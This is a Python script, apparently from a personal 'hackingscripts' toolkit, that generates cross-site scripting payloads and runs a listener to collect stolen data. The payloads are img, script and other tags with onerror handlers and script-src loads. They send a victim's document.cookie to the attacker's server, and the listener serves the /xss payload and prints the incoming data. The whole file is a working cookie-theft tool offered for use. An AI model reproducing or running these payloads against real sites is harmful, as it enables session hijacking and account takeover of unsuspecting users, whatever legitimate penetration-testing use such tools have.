#!/usr/bin/env python

from hackingscripts import util
import sys
import http.server
import socketserver
from http.server import HTTPServer, BaseHTTPRequestHandler

# returns http address
def getServerAddress(address, port):
    if port == 80:
        return "http://%s" % address
    else:
        return "http://%s:%d" % (address, port)

# returns js code: 'http://xxxx:yy/?x='+document.cookie
def getCookieAddress(address, port):
    return "'%s/?x='+document.cookie" % getServerAddress(address, port)

def generatePayload(type, address, port):

    payloads = []
    cookieAddress = getCookieAddress(address, port)

    media_tags = ["img","audio","video","image","body","script","object"]
    if type in media_tags:
        payloads.append('<%s src=1 href=1 onerror="javascript:document.location=%s">' % (type, cookieAddress))

    if type == "script":
        payloads.append('<script type="text/javascript">document.location=%s</script>' % cookieAddress)
        payloads.append('<script src="%s/xss" />' % getServerAddress(address, port))

    if len(payloads) == 0:
        return None

    return "\n".join(payloads)

class XssServer(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def _html(self):
        content = f"<html><body><h1>Got'cha</h1></body></html>"
        return content.encode("utf8")  # NOTE: must return a bytes object!

    def do_GET(self):
        self._set_headers()
        if self.path == "/xss":
            cookie_addr = getCookieAddress(util.getAddress(), listen_port)
            self.wfile.write(cookie_addr.encode())
        else:
            self.wfile.write(self._html())

    def do_HEAD(self):
        self._set_headers()

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        BaseHTTPRequestHandler.end_headers(self)

    def do_OPTIONS(self):
        self.send_response(200, "ok")
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        # self.send_header("Access-Control-Allow-Headers", "X-Requested-With")
        # self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        self._set_headers()
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length)
        print(post_data)
        self.wfile.write(self._html())

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print("Usage: %s <type> [port]" % sys.argv[0])
        exit(1)

    listen_port = None if len(sys.argv) < 3 else int(sys.argv[2])
    payload_type = sys.argv[1].lower()

    local_address = util.getAddress()

    # choose random port
    if listen_port is None:
        sock = util.openServer(local_address)
        if not sock:
            exit(1)
        listen_port = sock.getsockname()[1]
        sock.close()

    payload = generatePayload(payload_type, local_address, listen_port)
    if not payload:
        print("Unsupported payload type")
        exit(1)

    print("Payload:")
    print(payload)
    print()

    httpd = HTTPServer((local_address, listen_port), XssServer)
    print(f"Starting httpd server on {local_address}:{listen_port}")
    httpd.serve_forever()
